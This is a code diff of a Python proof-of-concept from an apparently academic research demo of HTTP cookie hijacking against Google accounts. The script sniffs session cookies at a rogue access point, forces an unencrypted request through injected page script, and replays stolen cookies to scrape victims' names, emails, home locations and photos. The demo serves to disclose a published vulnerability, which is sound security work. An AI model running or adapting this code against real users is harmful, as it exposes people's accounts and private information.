@@ -124,19 +124,36 @@ def make_request (user_ip, cookie):
 
 	global img_dict
 
-	url = 'http://www.google.com/?gws_rd=ssl'
+	url = 'http://www.google.com/search?q=home&oq=home&gws_rd=ssl'
 	add_headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36", "Accept-Language": "en-US,en;q=0.8"}
 	add_headers["Cookie"] = cookie
 	r = requests.get(url, headers=add_headers)
 	resp = r.content
 	soup = BeautifulSoup(resp, 'html.parser')
-	name_div = soup.findAll("div", { "class" : "gb_Cb"})
-	name = name_div[0].text
-	email_div = soup.findAll("div", { "class" : "gb_Db"})
-	email = email_div[0].text.split(" ")[0]
-	img_link = resp.split("::before{content:url(//")[1].split(");")[0].replace("/s32","/s500")
+	
+	#update the user image link
+	img_link = resp.split("::before{content:url(//")[1].split(");")[0].replace("/s32","/s150")
 	img_dict[user_ip] = img_link
-	return name, email
+
+	name_div = soup.findAll("div", { "class" : "gb_Cb"})
+	if len(name_div) > 0:
+		name = name_div[0].text
+	else:
+		name = " "
+
+	email_div = soup.findAll("div", { "class" : "gb_Db"})
+	if len(email_div) > 0:
+		email = email_div[0].text.split(" ")[0]
+	else:
+		email = " "
+
+	home_div = soup.findAll("div", { "class" : "vk_sh vk_bk"})
+	if len(home_div) > 0:
+		home = home_div[0].text.split("-")[1][1:]
+	else:
+		home = " "
+
+	return name, email, home
 
 
 ###########################################################################################################
@@ -209,13 +226,36 @@ def run_response_server():
 
 							if self.path == "/usr_cookie_attack_page.html": #send html response
 
-								name, email = make_request(self.client_address[0], cookie_dict[self.client_address[0]])
+								name, email, home = make_request(self.client_address[0], cookie_dict[self.client_address[0]])
 								self.send_response(200)
 								self.send_header('Content-type','text/html')
 								self.end_headers()
 
 								#make changes here to make the HTML look more facny
-								self.wfile.write("<center>"+name+"<br><br>"+email+"<br><br>"+"<img src=\"usr_cookie_attack_photo.jpg\" alt=\"profile_picture\" height=\"300\" width=\"300\"></center>")
+								self.wfile.write("<p>&nbsp;</p><h1 style=\"text-align:center\"><span style=\"font-family:arial,helvetica,sans-serif\"><big><span style=\"font-size:60px\">"\
+									"<strong><span style=\"color:#0066ff\">G</span><span style=\"color:#FF0000\">o</span><span style=\"color:#FFD700\">o</span><span style=\"color:#0066ff\">g"\
+									"</span><span style=\"color:#00cc33\">l</span><span style=\"color:#FF0000\">e</span></strong></span> <span style=\"font-size:55px\"><strong>Cookie Hijacking Demo"\
+									"</strong></span></big></span></h1><hr align=\"center\" style=\"width:820px\"/><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\">"\
+									"<tbody><tr><td><span style=\"font-size:28px\"><span style=\"color:#0066ff\"><u><strong><span style=\"font-family:arial,helvetica,sans-serif\">The Talk</span></strong></u>"\
+									"</span></span></td></tr><tr><td style=\"text-align:justify\"><p><span style=\"font-size:20px\"><span style=\"font-family:arial,helvetica,sans-serif\">This cookie hijacking demo "\
+									"is a demonstration of the research by Suphannee Sivakorn, Iasonas Polakis, and Angelos D. Keromytis from Columbia University. The original talk, titled &ldquo;<strong><em>The Cracked"\
+									"Cookie Jar: HTTP Cookie Hijacking and the Exposure of Private Information</em></strong>&rdquo; will be presented during session 9 (Don&#39;t go on the Web) on May 25, 2016 at the 37th "\
+									"IEEE Security &amp; Privacy Conference</span></span>.</p></td></tr></tbody></table><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody>"\
+									"<tr><td style=\"text-align: center;\"><span style=\"color:#0066ff\"><u><strong><span style=\"font-size:28px\"><span style=\"font-family:arial,helvetica,sans-serif\">Personal Information</span>"\
+									"</span></strong></u></span></td></tr><tr><td style=\"text-align:justify\"><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\" style=\"width:500px\"><tbody><tr><td>"\
+									"<img src=\"usr_cookie_attack_photo.jpg\" alt=\"profile_picture\" style=\"height:150px; width:150px\" /></td><td "\
+									"style=\"text-align:left\"><span style=\"font-size:20px\">&nbsp; &nbsp;&nbsp;</span></td><td><table align=\"left\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\" style=\"line-height:1.6; width:300px\">"\
+									"<tbody><tr><td style=\"text-align:center\"><p><span style=\"font-size:18px\"><span style=\"font-family:arial,helvetica,sans-serif\"><strong"+name+"</strong></span></span></p></td></tr><tr>"\
+									"<td style=\"text-align:center\"><span style=\"font-size:18px\"><span style=\"font-family:arial,helvetica,sans-serif\">"+email+"</span></span></td></tr><tr><td style=\"text-align:left\">"\
+									"<p style=\"text-align:center\"><span style=\"font-size:18px\"><span style=\"font-family:arial,helvetica,sans-serif\">"+home+"</span></span></p></td></tr></tbody></table><p>"\
+									"&nbsp;</p></td></tr></tbody></table></td></tr></tbody></table><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td><span style=\"font-size:28px\">"\
+									"<span style=\"color:#0066ff\"><u><strong><span style=\"font-family:arial,helvetica,sans-serif\">How it Works</span></strong></u></span></span></td></tr><tr><td style=\"text-align:justify\"><p><span style=\"font-"\
+									"size:20px\"><span style=\"font-family:arial,helvetica,sans-serif\">Google does not currently enforce ubiquitous encryption of incoming requests. By allowing HTTP connections to proceed, a malicious entity can cause "\
+									"a victim&rsquo;s browser to make requests in the clear, including Google session cookies. These cookies can then be used to make requests to Google which divulge sensitive information about the account in use. "\
+									"This POC&nbsp;works by including a resource from google.com using HTTP, which allows us to recover the user&rsquo;s Google session cookie. We then make requests to Google to elicit the sensitive information. "\
+									"We perform this attack after you click a button, but a malicious access point could easily inject references to google.com resources into any HTTP&nbsp;based response.</span></span></p></td></tr></tbody></table>"\
+									"<table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td style=\"text-align:center\"><p><span style=\"font-size:17px\"><span style=\"font-family:arial,helvetica,"\
+									"sans-serif\">*This demo was prepared by Mohammad Taha Khan, Chris Kanich and Steve Checkoway from the University of Illinois at Chicago</span></span>.</p></td></tr></tbody></table><hr align=\"center\" style=\"width:820px\"/><p>&nbsp;</p>")
 
 							cookie_flag = 1
 							return
@@ -236,9 +276,22 @@ def run_response_server():
 					self.send_response(200)
 					self.send_header('Content-type','text/html')
 					self.end_headers()
-					self.wfile.write("<!DOCTYPE html><html><img src=\"http://www.google.com/poop.png\" alt=\"Google\" style=\"width:10px;height:10px;\"><h1><center>Hey! Hold on a sec, let me steal your Google cookies</center></h1><br><h2><center>You just got owned...</center></h2><br><h3><center>Please read our Terms and Agreements before you proceed</center><h3></body><center><form action=\"http://172.16.42.1:8000/usr_cookie_attack_page.html\"><input type=\"submit\" value=\"See Personal Info\"></form><center></html>")
+					self.wfile.write("<p>&nbsp;</p><img id=\"demoImg\" src=\"https://example.com/whatever.png\" style=\"width:1px;height:1px\"><h1 style=\"text-align:center\"><span style=\"font-family:arial,"\
+						"helvetica,sans-serif\"><big><span style=\"font-size:60px\"><strong><span style=\"color:#0066ff\">G</span><span style=\"color:#FF0000\">o</span><span style=\"color:#FFD700\">o</span><span style=\"color:#0066ff\">g</span>"\
+						"<span style=\"color:#00cc33\">l</span><span style=\"color:#FF0000\">e</span> </strong></span><span style=\"font-size:55px\"><strong>Cookie Hijacking Demo</strong></span></big></span></h1><hr align=\"center\" style=\"width:820px\">"\
+						"<table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td><span style=\"font-size:28px\"><span style=\"color:#0066ff\"><u><strong><span style=\"font-family:arial,helvetica,sans-serif\">"\
+						"The Talk</span></strong></u></span></span></td></tr><tr><td style=\"text-align:justify\"><p><span style=\"font-size:20px\"><span style=\"font-family:arial,helvetica,sans-serif\">This cookie hijacking demo is a demonstration of the"\
+						"research by Suphannee Sivakorn, Iasonas Polakis, and Angelos D. Keromytis from Columbia University. The original talk, titled &ldquo;<strong><em>The Cracked Cookie Jar: HTTP Cookie Hijacking and the Exposure of Private Information</em>"\
+						"</strong>&rdquo; will be presented during session 9 (Don&#39;t go on the Web) on May 25, 2016 at the 37th IEEE Security &amp; Privacy Conference</span></span>.</p></td></tr></tbody></table><table align=\"center\" border=\"0\" cellpadding=\"1\""\
+						"cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td><span style=\"color:#0066ff\"><u><strong><span style=\"font-size:28px\"><span style=\"font-family:arial,helvetica,sans-serif\">About This Demo</span></span></strong></u></span></td></tr><tr>"\
+						"<td style=\"text-align:justify\"><p><span style=\"font-size:20px\"><span style=\"font-family:arial,helvetica,sans-serif\">This web page provides a demonstration of the attack described in the paper. If you click accept below, we will show you "\
+						"what information can be extracted from the cookies your browser sends in the clear to Google. This attack only provides limited visibility, and does not allow us to control your Google account in any way. All data is shown only to you, and we do "\
+						"not save any of this information.</span></span></p></td></tr></tbody></table><br><div align=\"center\"><style>.myButton {background-color:#cf2323;-moz-border-radius:8px;-webkit-border-radius:8px;border-radius:8px;border:1px solid #ffffff;display:in"\
+						"line-block;cursor:pointer;color:#ffffff;font-family:Arial;font-size:20px;padding:14px 37px;text-decoration:none;}</style><button id=\"demoBtn\" class=\"mybutton\">View Personal Information</button><script>document.getElementById(\"demoBtn\").onclick="\
+						"function(){document.getElementById(\"demoImg\").src = \"http://www.google.com/thisimagedoesnotexist.png\";window.setTimeout(window.location.href = \"http://172.16.42.1:8000/usr_cookie_attack_page.html\",10000);}</script></div><br><table align=\"center\" border=\"0\" cellpadding=\"1\""\
+						"cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td style=\"text-align:center\"><p><span style=\"font-size:17px\" ><span style=\"font-family:arial,helvetica,sans-serif\" >*This demo was prepared by Mohammad Taha Khan, Chris Kanich and Steve Checkoway from the University "\
+						"of Illinois at Chicago</span></span>.</p></td></tr></tbody></table><hr align=\"center\" style=\"width:820px\"><p>&nbsp;</p>")
 					return
-
 
 	class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
 	    """Handle requests in a separate thread."""
@@ -297,25 +350,24 @@ def main():
 	#run_response_server()
 	#Run the response server in a parallel thread
 	server_thread = threading.Thread(target=run_response_server, args=())
-	server_thread.daemon = True   
+	#server_thread.daemon = True   
 	server_thread.start()
 
 	# Create a raw socket for listening to all packets
-	interface = sys.argv[1]
-	cookie_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
-	cookie_socket.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
-	cookie_socket.bind((interface, ETH_P_ALL))
+	# interface = sys.argv[1]
+	# cookie_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
+	# cookie_socket.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
+	# cookie_socket.bind((interface, ETH_P_ALL))
 
-	# Continously listen for packets and parse them
-	print "now listening on: "+interface
-	while True:
+	# # Continously listen for packets and parse them
+	# print "now listening on: "+interface
+	# while True:
 
-		pkt, sa_ll = cookie_socket.recvfrom(MTU)
-		packet_elements = packet_parser(pkt)
+	# 	pkt, sa_ll = cookie_socket.recvfrom(MTU)
+	# 	packet_elements = packet_parser(pkt)
 
-		if packet_elements != None:
-			extract_cookie(packet_elements[0], packet_elements[1], packet_elements[2])
-			
+	# 	if packet_elements != None:
+	# 		extract_cookie(packet_elements[0], packet_elements[1], packet_elements[2])
 
 if __name__ == '__main__':
 	main()
